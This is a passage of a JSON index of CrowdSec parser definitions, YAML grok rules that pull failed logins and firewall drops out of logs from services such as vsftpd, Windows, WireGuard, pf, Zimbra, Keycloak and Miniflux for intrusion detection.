'(?:%{SYSLOGTIMESTAMP:timestamp}|%{TIMESTAMP_ISO8601:timestamp8601}) %{UNIFI_HOSTNAME}(?: %{UNIFI_HOSTNAME})? %{UNIFI_FIREWALL_PREFIX}(?:%{SYSLOGPROG}:|)'\n  SYSLOGLINE_UNIFI: '%{SYSLOGBASE_UNIFI} %{GREEDYDATA:message}'\nname: crowdsecurity/unifi-logs\nnodes:\n  - grok:\n      pattern: \"^%{SYSLOGLINE_UNIFI}\"\n      apply_on: Line.Raw\nstatics:\n  - parsed: program\n    expression: \"evt.Parsed.program != '' ? evt.Parsed.program : evt.Parsed.action != '' ? 'kernel' : ''\"\n  - meta: machine\n    expression: evt.Parsed.hostname\n  - parsed: \"logsource\"\n    value: \"syslog\"\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp8601\n  - meta: datasource_path\n    expression: evt.Line.Src\n  - meta: datasource_type\n    expression: evt.Line.Module\n  - meta: action\n    expression: 'evt.Parsed.action == \"\" ? \"\" : evt.Parsed.action == \"A\" ? \"accept\" : (evt.Parsed.action == \"D\" ? \"drop\" : (evt.Parsed.action == \"R\" ? \"reject\" : \"unknown\"))'\n  - meta: log_type\n    expression: 'evt.Meta.action not in [\"accept\", \"unknown\"] ? \"iptables_drop\" : \"iptables_event\"'", "path": "parsers/s00-raw/crowdsecurity/unifi-logs.yaml", "stage": "s00-raw", "version": "0.2", "versions": {"0.1": {"digest": "fd8bfd95085177fec395efdddf00161bcf490a2d156aabcea5fc1c2cae6f3f17"}, "0.2": {"digest": "b2c94ca437b903497f2ce63777a1ae853eeec9cce9a398df2d7b145246647028"}}}, "crowdsecurity/vsftpd-logs": {"content": "onsuccess: next_stage\nname: vsftpd-logs\ndescription: \"Parse VSFTPD logs\"\nfilter: \"evt.Parsed.program == 'vsftpd'\"\n#debug: true\npattern_syntax:\n  # Custom grok for some versions that add an extra space before single digit monthday\n  # Not perfect because extra ,spaces are not trimmed in resulting 'timestamp' capture\n  CUSTOM_HTTPDERROR_DATE: '%{DAY} %{MONTH} (?:\\s?)%{MONTHDAY} %{TIME} %{YEAR}'\n  FTP_AUTH_FAIL: '%{CUSTOM_HTTPDERROR_DATE:timestamp} \\[pid %{NUMBER}\\] \\[%{GREEDYDATA:user}\\] FAIL LOGIN: Client \"(::ffff:)?%{IP:source_ip}\"'\n  FTP_DENIED_USER: '%{CUSTOM_HTTPDERROR_DATE:timestamp} \\[pid %{NUMBER}\\] \\[%{GREEDYDATA:user}\\] FTP response: Client \"(::ffff:)?%{IP:source_ip}\", \"530 Permission denied.\"'\nnodes:\n  - grok:\n      pattern: \"%{FTP_AUTH_FAIL}\"\n      apply_on: message\n  - grok:\n      pattern: \"%{FTP_DENIED_USER}\"\n      apply_on: message\nstatics:\n    - meta: program\n      value: vsftpd\n    - meta: log_type\n      value: ftp_failed_auth\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - meta: user\n      expression: \"evt.Parsed.user\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n    - target: evt.StrTimeFormat\n      value: \"Mon Jan _2 15:04:05 2006\"\n", "description": "Parse VSFTPD logs", "path": "parsers/s01-parse/crowdsecurity/vsftpd-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "39d986c6005d2b96b8941a71ee81c4af35bd22b1094685a8b7f7fbc00e1b4f7f"}, "0.2": {"digest": "a06ecb5ef08f47fd4e0d70abfa1c78a8570488c8741d660614d97354c17cc4cc"}, "0.3": {"digest": "2d32b1f35244aeeaa36e66ae3f5538d2d1aa22a66cbe350b26a3845bf99de4c5"}}}, "crowdsecurity/whitelists": {"content": "name: crowdsecurity/whitelists\ndescription: \"Whitelist events from private ipv4 addresses\"\nwhitelist:\n  reason: \"private ipv4/ipv6 ip/ranges\"\n  ip: \n    - \"::1\"\n  cidr:\n    - \"127.0.0.0/8\"\n    - \"192.168.0.0/16\"\n    - \"10.0.0.0/8\"\n    - \"172.16.0.0/12\"\n  # expression:\n  #   - \"'foo.com' in evt.Meta.source_ip.reverse\" \n\n", "description": "Whitelist events from private ipv4 addresses", "path": "parsers/s02-enrich/crowdsecurity/whitelists.yaml", "stage": "s02-enrich", "version": "0.3", "versions": {"0.1": {"digest": "f51f41270a7ff9900d9c815beccc3ded36a1c377a6e21dd19f9d8209623789b1"}, "0.2": {"digest": "326da7ad71aee690bf71c5a392ac6dbd028f502e617a8b8ed7a5c5554ecaf72c"}, "0.3": {"digest": "940322deea257698388981529bbd59a62dc963e4dd489db44fccbfd127903a5d"}}}, "crowdsecurity/windows-auth": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.Channel == 'Security' && evt.Parsed.EventID == '4625'\"\nname: crowdsecurity/windows-auth\ndescription: \"Parse windows authentication failure events (id 4625)\"\nstatics:\n    - meta: source_ip\n      expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='IpAddress']\")\n    - meta: username\n      expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='TargetUserName']\")\n    - meta: status\n      expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='Status']\")\n    - meta: sub_status\n      expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='SubStatus']\")\n    - meta: logon_type\n      expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/EventData[1]/Data[@Name='LogonType']\")\n    - meta: log_type\n      value: windows_failed_auth", "description": "Parse windows authentication failure events (id 4625)", "path": "parsers/s01-parse/crowdsecurity/windows-auth.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}, "0.2": {"digest": "c0e604a0512e61cdd102c9ebc9267c3e546712f05b75a912695808a45e08dc51"}, "0.3": {"digest": "32fce959d99316ee2d7a7f7caf1a0b9e856114d785c750dbd60a7d435e1f0cd0"}}}, "crowdsecurity/windows-firewall-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'windows-firewall' and evt.Parsed.message contains ' DROP TCP ' and evt.Parsed.message contains ' RECEIVE'\"\nname: crowdsecurity/windows-firewall-logs\ndescription: \"Parse windows firewall drop logs\"\ngrok:\n  pattern: \"%{TIMESTAMP_ISO8601:date} DROP TCP %{IP:src_ip} %{IP:dst_ip} %{INT:src_port} %{INT:dst_port} %{INT:size} %{WORD:flags} %{INT:tcpsyn} %{INT:tcpack} %{INT:window} - - - RECEIVE( %{INT:pid})?\" \n  apply_on: message\nstatics:\n    - meta: service\n      value: tcp\n    - meta: log_type\n      value: iptables_drop\n    - meta: source_ip\n      expression: \"evt.Parsed.src_ip\"\n    - target: evt.StrTime\n      expression: evt.Parsed.date\n\n", "description": "Parse windows firewall drop logs", "path": "parsers/s01-parse/crowdsecurity/windows-firewall-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "a093e7fccc9ca714c70284b7f2898a1e2c785b565fbdc63778960c07306ecf7f"}, "0.2": {"digest": "44779151d40327fa5b2a882165dac19c71f47a75aa994dda0ff9190b7417ef5f"}, "0.3": {"digest": "006ab41688651b1151c017f6a9da16e6ae86e74d171c9a28dbbb092ca8a38b94"}}}, "crowdsecurity/windows-logs": {"content": "filter: \"evt.Line.Module == 'wineventlog'\"\nonsuccess: next_stage\nname: crowdsecurity/windows-eventlog\nstatics:\n  - meta: datasource_path\n    expression: evt.Line.Src\n  - meta: datasource_type\n    expression: evt.Line.Module\n  - target: evt.StrTime\n    #We need XMLGetAttributeValue because etree does not support getting an attribute value (or at least, i didn't manage to make the correct query)\n    expression: XMLGetAttributeValue(evt.Line.Raw, \"/Event/System[1]/TimeCreated\", \"SystemTime\")\n  - parsed: Channel\n    expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/System[1]/Channel\")\n  - parsed: EventID\n    expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/System[1]/EventID\")\n  - parsed: Source\n    expression: XMLGetAttributeValue(evt.Line.Raw, \"/Event/System[1]/Provider\", \"Name\")\n  - parsed: Computer\n    expression: XMLGetNodeValue(evt.Line.Raw, \"/Event/System[1]/Computer\")\n  - parsed: UserSID\n    expression: XMLGetAttributeValue(evt.Line.Raw, \"/Event/System[1]/Security\", \"UserID\")\n  - parsed: program\n    expression: evt.Line.Labels.type\n---\nfilter: \"evt.Line.Module != 'wineventlog'\"\nonsuccess: next_stage\nname: crowdsecurity/windows-non-eventlog\nstatics:\n  - parsed: message\n    expression: evt.Line.Raw\n  - parsed: program\n    expression: evt.Line.Labels.type\n  - meta: datasource_path\n    expression: evt.Line.Src\n  - meta: datasource_type\n    expression: evt.Line.Module\n\n", "path": "parsers/s00-raw/crowdsecurity/windows-logs.yaml", "stage": "s00-raw", "version": "0.4", "versions": {"0.1": {"digest": "f51a9f48a321f6935c44515ee8ec312d7771a6ced5bf63d9ab8dede2a3b77e9d"}, "0.2": {"digest": "65d086df4579e371213259dffdf4ff22b27a107a4200327b0b86b5605fed4d43"}, "0.3": {"digest": "686608f2d4fb9813b41bd8a1d8683a0a2ee69ff453b6dfd2905e27e1d38634d2"}, "0.4": {"digest": "800aad4d3be5717d2c389a774462b54eb8ccd2f23755e328fb7d8865f426fa67"}}}, "crowdsecurity/wireguard-logs": {"content": "filter: \"evt.Parsed.program == 'kernel' and evt.Parsed.message contains 'wireguard:'\"\n#debug: true\nonsuccess: next_stage\nname: crowdsecurity/wireguard-logs\ndescription: \"Parses wireguard log via dyndbg\"\npattern_syntax:\n  WIREGUARD_INVALID_HANDSHAKE: 'wireguard: wg%{INT}: Packet has unallowed src IP \\(%{IP}\\) from peer %{INT} \\(%{IP:source_ip}:%{INT}\\)'\n  WIREGUARD_UNAUTHORIZED_PACKET: 'wireguard: wg%{INT}: Invalid handshake initiation from %{IP:source_ip}:%{INT}'\nnodes:\n - grok:\n     name: \"WIREGUARD_INVALID_HANDSHAKE\"\n     apply_on: message\n     statics:\n       - meta: log_type\n         value: wireguard_failed_auth\n       - meta: log_subtype\n         value: wireguard_invalid_handshake\n - grok:\n     name: \"WIREGUARD_UNAUTHORIZED_PACKET\"\n     apply_on: message\n     statics:\n       - meta: log_type\n         value: wireguard_failed_auth\n       - meta: log_subtype\n         value: wireguard_unauthorized_packet\n\nstatics:\n - meta: service\n   value: wireguard\n - meta: source_ip\n   expression: \"evt.Parsed.source_ip\"", "description": "Parses wireguard log via dyndbg", "path": "parsers/s01-parse/crowdsecurity/wireguard-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "fa206b8f4bed11951bf44f85790c87c9eebd410c1ab623347cbe6ebf64274229"}}}, "darkclip/charon-ipsec-logs": {"content": "name: darkclip/charon-ipsec-logs\n#debug: true\nfilter: \"evt.Parsed.program == 'charon'\"\ndescription: Parse Charon IPsec logs\nonsuccess: next_stage\npattern_syntax:\n  IPSEC_ID: '<%{DATA}\\|%{NUMBER}>'\nnodes:\n  - grok:\n      pattern: '^%{NUMBER:thread}\\[%{WORD:subsys}\\] %{IPSEC_ID:ipsec_id}.*verification.*failed.*'\n      apply_on: message\n    stash:\n      - name: charon_ipsec_logs\n        key: evt.Parsed.thread\n        value: evt.Parsed.ipsec_id\n        ttl: 5s\n        size: 10\n  - grok:\n      pattern: '^%{NUMBER:thread}\\[%{WORD:subsys}\\] %{IPSEC_ID:ipsec_id}.*authentication.*failed.*'\n      apply_on: message\n    stash:\n      - name: charon_ipsec_logs\n        key: evt.Parsed.thread\n        value: evt.Parsed.ipsec_id\n        ttl: 5s\n        size: 10\n  - grok:\n      pattern: '^%{NUMBER:thread}\\[%{WORD:subsys}\\] %{IPSEC_ID:ipsec_id} sending packet\\: from %{IP:target_ip}\\[%{NUMBER:target_port}\\] to %{IP:source_ip}\\[%{NUMBER:source_port}\\].*'\n      apply_on: message\n    nodes:\n      - filter: \"GetFromStash('charon_ipsec_logs', evt.Parsed.thread) != '' && GetFromStash('charon_ipsec_logs', evt.Parsed.thread) == evt.Parsed.ipsec_id\"\n        statics:\n          - meta: log_type\n            value: charon_ipsec_auth_fail\n          - meta: source_ip\n            expression: evt.Parsed.source_ip\n\nstatics:\n  - meta: service\n    value: charon_ipsec\n", "description": "Parse Charon IPsec logs", "path": "parsers/s01-parse/darkclip/charon-ipsec-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "78622315a1cd3b5c4c8650479388ca4846daa6341134a172735044486be8072a"}}}, "firewallservices/lemonldap-ng": {"content": "filter: \"evt.Parsed.program in ['LLNG','lemonldap-ng']\"\nname: firewall-services/lemonldap-ng-logs\ndescription: \"Parse Lemonldap::NG logs\"\nonsuccess: next_stage\n#debug: true\nnodes:\n  - grok:\n      pattern: (\\[warn\\]|Lemonldap::NG :) %{USERNAME:user} was not found in LDAP directory \\(%{IP:src_ip}\\)\n      apply_on: message\n  - grok:\n      pattern: (\\[warn\\]|Lemonldap::NG :) Bad password for %{USERNAME:user} \\(%{IP:src_ip}\\)\n      apply_on: message\nstatics:\n  - meta: service\n    value: llng\n  - meta: user\n    expression: \"evt.Parsed.user\"\n  - meta: log_type\n    value: llng_auth_fail\n  - meta: source_ip\n    expression: \"evt.Parsed.src_ip\"\n", "description": "Parse Lemonldap::NG logs", "path": "parsers/s01-parse/firewallservices/lemonldap-ng.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "c83b26a572bdb7ea16dcc004729dff7977aa5293466fba834bb7e2d740526ec1"}}}, "firewallservices/pf-logs": {"content": "# For more information see\n# https://github.com/opnsense/ports/blob/master/opnsense/filterlog/files/description.txt\n# and\n# https://docs.netgate.com/pfsense/en/latest/monitoring/logs/raw-filter-format.html\nfilter: \"evt.Parsed.program == 'filterlog' or evt.Parsed.message matches '^filterlog:'\"\nname: firewallservices/pf-logs\ndescription: \"Parse packet filter logs\"\nformat: 2.0\npattern_syntax:\n  # WORD including special characters\n  PF_WORD: '%{USERNAME}'\n  \n  # rulenr, subrulenr, anchorname, label | \"0\", interface, reason, action, dir\n  PF_BASE: '%{INT:rule},(%{INT:sub_rule})?,(%{WORD:anchorname})?,(%{WORD:tracker}| 0),%{PF_WORD:iface},%{WORD:reason},%{WORD:action},%{WORD:direction}'\n\n  # tos, ecn, ttl, id, offset, flags, protonum, protoname, length, src, dst\n  PF_IPV4_DATA: '%{BASE16NUM:ip4_tos},(%{INT:ip4_ecn})?,%{INT:ip4_ttl},%{INT:ip4_id},%{INT:ip4_offset},%{WORD:ip4_flags},%{INT:ip4_proto_id},%{WORD:ip4_proto}'\n  # class, flow, hoplimit, protoname, protonum\n  PF_IPV6_DATA: '%{BASE16NUM:ip6_class},%{BASE16NUM:ip6_flow_label},%{INT:ip6_hop_limit},%{WORD:ip6_proto},%{INT:ip6_proto_id}'\n  # ipversion, ..., length, src, dst\n  PF_IP: '%{INT:ip_ver},(%{PF_IPV4_DATA}|%{PF_IPV6_DATA}),%{INT:length},%{IP:src_ip},%{IP:dst_ip}'\n\n  # srcport, dstport, datalen\n  PF_UDP_DATA: '%{POSINT:src_port},%{POSINT:dst_port},%{INT:data_length}'\n  # srcport, dstport, datalen, flags, seq, ack, window, urg, options\n  PF_TCP_DATA: '%{WORD:tcp_flags},%{INT:sequence_number},(?:%{INT:ack_number})?,%{INT:tcp_window},(%{DATA:urg_data})?,%{GREEDYDATA:tcp_options}'\n  # both protocols start with the same three values\n  PF_PROTOCOL: '%{PF_UDP_DATA}(,%{PF_TCP_DATA})?'\ngrok:\n  pattern: \"%{PF_BASE},%{PF_IP},%{PF_PROTOCOL}\"\n  apply_on: message\nstatics:\n  - meta: log_type\n    value: pf\n---\nfilter: \"evt.Meta.log_type == 'pf' and evt.Parsed.action == 'block'\"\nname: firewallservices/pf-logs-drop\ndescription: \"Identify dropped packets\"\nonsuccess: next_stage\nstatics:\n  - meta: service\n    expression: \"evt.Parsed.ip4_proto != nil ? evt.Parsed.ip4_proto : evt.Parsed.ip6_proto\"\n  - meta: log_type\n    value: pf_drop\n  - meta: source_ip\n    expression: \"evt.Parsed.src_ip\"\n  - meta: rulenr\n    expression: \"evt.Parsed.rule\"\n  - meta: ruleid\n    expression: \"evt.Parsed.tracker\"\n  - meta: iface\n    expression: \"evt.Parsed.iface\"\n", "description": "Parse packet filter logs", "path": "parsers/s01-parse/firewallservices/pf-logs.yaml", "stage": "s01-parse", "version": "0.6", "versions": {"0.1": {"digest": "2c0bd0180b9e018fea93d65782840ddd6927c1992072734b68cd03b9877d6529"}, "0.2": {"digest": "51ce3d1dcda6976e95bffc259e7476b2d1e0dfeb3898c4575739622102780279"}, "0.3": {"digest": "2dda7e888f302ec6e51158ae64f2a0f7152a474f034b0728e735ad4ec05d5894"}, "0.4": {"digest": "13257da36d5003ab8f212c94fa8fc7f5249ef95341602a25d324a4a1416843e1"}, "0.5": {"digest": "934d874b2811c83374a3555cbeefcb7f60d43a64e30c990f2c26c2b368d9e044"}, "0.6": {"digest": "678c65229fd704a0cd9c63e4aa399977e31f28df79ccc7a561440836af98e232"}}}, "firewallservices/zimbra-logs": {"content": "filter: \"evt.Parsed.program startsWith 'zimbra'\"\nonsuccess: next_stage\n#debug: true\nname: firewallservices/zimbra-logs\ndescription: \"Parse zimbra authentication failures\"\nnodes:\n  - grok:\n      pattern: '%{TIMESTAMP_ISO8601:time_local}:[0-9]+,.*%{WORD:proto}://%{HOSTNAME:server}:%{INT:port}/service/admin/soap/(AuthRequest)?\\] \\[.*oip=%{IP:src_ip}.*\\] SoapEngine - handler exception: authentication failed for \\[%{NGUSER:user}\\]'\n      apply_on: message\n    statics:\n        - target: evt.StrTime\n          expression: evt.Parsed.time_local\n  - grok:\n      pattern: '%{TIMESTAMP_ISO8601:time_local}:[0-9]+,.*%{WORD:proto}://%{HOSTNAME:server}:%{INT:port}/service/admin/soap/(AuthRequest)?\\] \\[.*name=%{NGUSER:user}.*oip=%{IP:src_ip}.*\\] SoapEngine - handler exception'\n      apply_on: message\n    statics:\n        - target: evt.StrTime\n          expression: evt.Parsed.time_local\n  - grok:\n      pattern: '%{TIMESTAMP_ISO8601:time_local}:[0-9]+,.*\\[.*oip=%{IP:src_ip}.*\\] imap - authentication failed for \\[%{NGUSER:user}\\]'\n      apply_on: message\n    statics:\n        - target: evt.StrTime\n          expression: evt.Parsed.time_local\nstatics:\n  - meta: service\n    value: zimbra\n  - meta: log_type\n    value: zimbra_auth_fail\n  - meta: source_ip\n    expression: \"evt.Parsed.src_ip\"\n  - meta: user\n    expression: \"evt.Parsed.user\"\n", "description": "Parse zimbra authentication failures", "path": "parsers/s01-parse/firewallservices/zimbra-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "f01fc443e18d03cc336c4a8a6cbf7afc47e0faba7b07129f58f802415fc8a394"}}}, "firix/authentik-logs": {"content": "name: firix/authentik-logs\ndescription: \"Parse Authentik logs\"\nfilter: \"Lower(evt.Parsed.program) == 'authentik'\"\nonsuccess: next_stage\nnodes:\n  - filter: \"JsonExtract(evt.Parsed.message, 'action') == 'login_failed'\"\n    statics:\n      - meta: log_type\n        value: authentik_failed_auth\n      - meta: username\n        expression: JsonExtract(evt.Parsed.message, \"context.username\")\n  - filter: \"JsonExtract(evt.Parsed.message, 'action') == 'invalid_identifier'\"\n    statics:\n      - meta: log_type\n        value: authentik_invalid_username\n      - meta: username\n        expression: JsonExtract(evt.Parsed.message, \"identifier\")\nstatics:\n  - meta: service\n    value: authentik\n  - meta: source_ip\n    expression: JsonExtract(evt.Parsed.message, \"client_ip\")\n  - target: evt.StrTime\n    expression: JsonExtract(evt.Parsed.message, \"timestamp\") + \"Z\"\n", "description": "Parse Authentik logs", "path": "parsers/s01-parse/firix/authentik-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "b589807f2d6a21aa2dd07bf5a382f7c1d1ab18eb76108a714798258092d9e677"}}}, "fulljackz/proxmox-logs": {"content": "#debug: true\nname: fulljackz/proxmox-logs\ndescription: \"Parse proxmox logs for bruteforce attempts\"\nfilter: \"evt.Parsed.program == 'pvedaemon'\"\nonsuccess: next_stage\npattern_syntax:\n  PVE_AUTH_FAIL: 'authentication failure; rhost=%{IP:client_ip} user=%{USERNAME:source_user}@%{WORD:realm} msg='\nnodes:\n  - grok:\n      name: \"PVE_AUTH_FAIL\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: pve_failed-auth\n        - meta: source_user\n          expression: \"evt.Parsed.source_user\"\nstatics:\n    - meta: service\n      value: pvedaemon\n    - meta: source_ip\n      expression: \"evt.Parsed.client_ip\"\n", "description": "Parse proxmox logs for bruteforce attempts", "path": "parsers/s01-parse/fulljackz/proxmox-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "889e85448093d9acb0a65e625eeb3e889e2bc2d7a43c3877a7f047d63f7fab28"}, "0.2": {"digest": "51329df99cd69cf6cf0195157a8589adaf6928aa84bc852deeb868f30cca4932"}}}, "fulljackz/pureftpd-logs": {"content": "#debug: true\nname: fulljackz/pureftpd-logs\ndescription: \"Parse pureftpd logs for bruteforce attempts\"\nfilter: \"evt.Parsed.program == 'pure-ftpd'\"\nonsuccess: next_stage\npattern_syntax:\n  PFTPD_AUTH_FAIL: '\\(?@%{IP:client_ip}\\) \\[WARNING\\] Authentication failed for user \\[%{WORD:user}\\]'\nnodes:\n  - grok:\n      name: \"PFTPD_AUTH_FAIL\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: pftpd_failed-auth\n        - meta: source_user\n          expression: \"evt.Parsed.user\"\nstatics:\n    - meta: service\n      value: pureftpd\n    - meta: source_ip\n      expression: \"evt.Parsed.client_ip\"\n", "description": "Parse pureftpd logs for bruteforce attempts", "path": "parsers/s01-parse/fulljackz/pureftpd-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "db21a9c06ffb7dbcdd420b62b51e5c13333dcc48556faae3fb49c65058b16737"}}}, "gauth-fr/immich-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: gauth-fr/immich-logs\ndescription: \"Parse Immich logs\"\nfilter: \"evt.Parsed.program == 'immich'\"\npattern_syntax:\n  IMMICH_CUSTOMDATE_PM: \"%{MONTHNUM2}/%{MONTHDAY}/%{YEAR}, %{TIME} (AM|PM|am|pm)\"\n  IMMICH_CUSTOMDATE: \"%{MONTHNUM2}/%{MONTHDAY}/%{YEAR}, %{TIME}\"\nnodes:\n  - grok:\n      pattern: \".*%{IMMICH_CUSTOMDATE_PM:timestamp}.*Failed login attempt for user %{EMAILADDRESS:username} from ip address %{IP:source_ip}.*\"\n      #[Nest] 7  - 08/02/2023, 7:34:03 PM    WARN [AuthService] Failed login attempt for user fds@hdd.com from ip address 176.172.44.211\n\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: immich_failed_auth\n        - target: evt.StrTimeFormat\n          value: \"01/02/2006, 3:04:05 PM\"\n  - grok:\n      pattern: \".*%{IMMICH_CUSTOMDATE:timestamp}.*Failed login attempt for user %{EMAILADDRESS:username} from ip address %{IP:source_ip}.*\"\n      #[Nest] 7  - 08/02/2023, 7:34:03    WARN [AuthService] Failed login attempt for user fds@hdd.com from ip address 176.172.44.211\n\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: immich_failed_auth\n        - target: evt.StrTimeFormat\n          value: \"01/02/2006, 15:04:05\"\n\nstatics:\n    - meta: service\n      value: immich\n    - meta: user\n      expression: \"evt.Parsed.username\"\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n", "description": "Parse Immich logs", "path": "parsers/s01-parse/gauth-fr/immich-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "5a9e8bfc8183eac0ae04713773e2fe932771a70eeebbd191b88d48abca944aad"}, "0.2": {"digest": "a8e655f18af1598eee89e0bc8a417f52c6c48139c8124b4e9bdee32357faa85d"}}}, "hitech95/nginx-mail-logs": {"content": "filter: \"evt.Parsed.program startsWith 'nginx'\"\nonsuccess: next_stage\nname: hitech95/nginx-mail-logs\ndescription: \"Parse Nginx Mail logs\"\npattern_syntax:\n  NO_DOUBLE_QUOTE: '[^\"]+'\nnodes:\n  - grok:\n      pattern: '%{NGINXERRTIME:time} \\[%{LOGLEVEL:loglevel}\\] %{NONNEGINT:pid}#%{NONNEGINT:tid}: (\\*%{NONNEGINT:cid} )?client %{IPORHOST:remote_addr}:%{POSINT:remote_port} connected to %{IPORHOST:dest_ip}:%{POSINT:dest_port}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: \"mail_new_session\"\n        - target: evt.StrTime\n          expression: evt.Parsed.time\n  - grok:\n      pattern: '%{NGINXERRTIME:time} \\[%{LOGLEVEL:loglevel}\\] %{NONNEGINT:pid}#%{NONNEGINT:tid}: (\\*%{NONNEGINT:cid} )?%{GREEDYDATA:message}, client: %{IPORHOST:remote_addr}( using starttls,|,) server: %{IPORHOST:dest_ip}:%{POSINT:dest_port}(, login: \"%{NO_DOUBLE_QUOTE:username}\")?(, upstream: %{IPORHOST:proxy_ip}:%{POSINT:proxy_port})?'\n      apply_on: message\n    filter: \"evt.Parsed.message contains 'client '\"\n    statics:\n      - target: evt.StrTime\n        expression: evt.Parsed.time\n      - meta: username\n        expression: evt.Parsed.username\n      - meta: log_type\n        value: \"mail_auth\"\n    nodes:\n      - filter: \"evt.Parsed.message contains 'logged in'\"\n        statics:\n          - meta: sub_type\n            value: \"auth_success\"\n      - filter: \"evt.Parsed.message contains 'login failed'\"\n        pattern_syntax:\n          MAIL_HTTP_AUTH: 'client login failed: \"%{NO_DOUBLE_QUOTE:auth_result}\" while'\n        grok:\n          pattern: '%{MAIL_HTTP_AUTH}'\n          apply_on: message\n        statics:\n          - meta: sub_type\n            value: \"auth_fail\"\n          - meta: auth_result\n            expression: evt.Parsed.auth_result\n# these ones apply for both grok patterns\nstatics:\n  - meta: service\n    value: mail\n  - meta: source_ip\n    expression: \"evt.Parsed.remote_addr\"\n  - meta: dest_ip\n    expression: \"evt.Parsed.dest_ip\"\n  - meta: dest_port\n    expression: \"evt.Parsed.dest_port\"\n", "description": "Parse Nginx Mail logs", "path": "parsers/s01-parse/hitech95/nginx-mail-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "52e65aa1d01faed9b6c45508c1c13a75b0c7228ac734490baa43ae2d0976f392"}, "0.2": {"digest": "5013628977cb53d8e5f287db60811e9b896afec12dfbe8f3e578fdb889d62e8c"}}}, "inherent-io/keycloak-logs": {"content": "filter: evt.Parsed.program == 'keycloak'\nonsuccess: next_stage\nname: inherent-io/keycloak-logs\ndescription: \"Parse keycloak logs\"\npattern_syntax:\n  KEYCLOAK_DATETIME: \"[0-9]+-[0-9]+-[0-9]+ [0-2][0-9]:[0-5][0-9]:[0-5][0-9],[0-9]{3}\"\n  KEYCLOAK_LOG_LEVEL: \"(DEBUG|WARN|ERROR|INFO)\"\n  KEYCLOAK_LOG_LINE: '^%{KEYCLOAK_DATETIME:datetime} %{KEYCLOAK_LOG_LEVEL:log_level}\\s+\\[org.*\\]\\s+\\(executor-thread-\\d+\\)\\s+%{GREEDYDATA:parsed_message}'\nnodes:\n  - grok:\n      name: \"KEYCLOAK_LOG_LINE\"\n      apply_on: message\n    nodes:\n      - filter: ParseKV(evt.Parsed.parsed_message, evt.Unmarshaled, \"keycloak\") in [\"\", nil]\n        statics:\n          - meta: log_type\n            expression: trimSuffix(evt.Unmarshaled.keycloak.type, \",\")\n          - meta: error\n            expression: trimSuffix(evt.Unmarshaled.keycloak.error ?? \"\", \",\")\n          - meta: source_ip\n            expression: trimSuffix(evt.Unmarshaled.keycloak.ipAddress, \",\")\n          - meta: username\n            expression: trimSuffix(evt.Unmarshaled.keycloak.username, \",\")\nstatics:\n  - meta: service\n    value: keycloak\n  - target: evt.StrTime\n    expression: evt.Parsed.datetime\n  - meta: log_level\n    expression: evt.Parsed.log_level\n  - target: evt.StrTimeFormat\n    value: \"2006-01-02 15:04:05,999999999\"\n", "description": "Parse keycloak logs", "path": "parsers/s01-parse/inherent-io/keycloak-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "82a556a0a3caba20dfc0d2cf5a6b794014cf0154dae388e979a249751673a5b2"}, "0.2": {"digest": "813c80f85c54accb12fed144d7e6914038e4ef88df51baf1b2722a0f717a270e"}}}, "jbowdre/miniflux-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: jbowdre/miniflux-logs\ndescription: \"Parse Miniflux logs\"\nfilter: \"evt.Parsed.program == 'miniflux'\"\n\nnodes:\n  - grok:\n      pattern: '.*time=%{DATA:timestamp} .*authentication_failed=true client_ip=%{IP:source_ip} .*username=%{USERNAME:username} .*error=\"store: invalid password for \\\\\"%{USERNAME}\\\\\".*\"'\n      # miniflux  | time=2024-01-12T22:55:30.265Z level=WARN msg=\"Incorrect username or password\" authentication_failed=true client_ip=192.168.0.254 user_agent=\"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\" username=user1 error=\"store: invalid password for \\\"user1\\\" (crypto/bcrypt: hashedPassword is not the hash of the given password)\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: miniflux_failed_auth\n        - meta: log_subtype\n          value: miniflux_bad_password\n        - meta: evt.StrTimeFormat\n          value: \"2006-01-02T15:04:05.999Z\"\n  - grok:\n      pattern: '.*time=%{DATA:timestamp} .*authentication_failed=true 